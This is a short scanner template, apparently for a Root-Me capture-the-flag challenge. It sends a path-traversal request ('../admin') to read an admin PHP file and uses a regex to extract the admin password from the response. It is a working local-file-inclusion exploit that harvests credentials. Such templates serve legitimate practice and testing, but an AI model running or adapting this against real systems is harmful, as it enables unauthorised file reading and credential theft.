id: LocalFileInclusion
info:
  author: Tomitom13
  name: Local File Inclusion
  severity: unknown
  tags: lfi,rootme
requests:
- extractors:
  - name: password
    part: body
    regex:
    - admin' =&gt; '[a-zA-Z0-9!@#$%^&*()_+\-,.<>?]+'
    type: regex
  matchers:
  - status:
    - 200
    type: status
  - part: body
    type: word
    words:
    - '''admin'' =&gt; '''
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/?files=../admin&f=index.php'
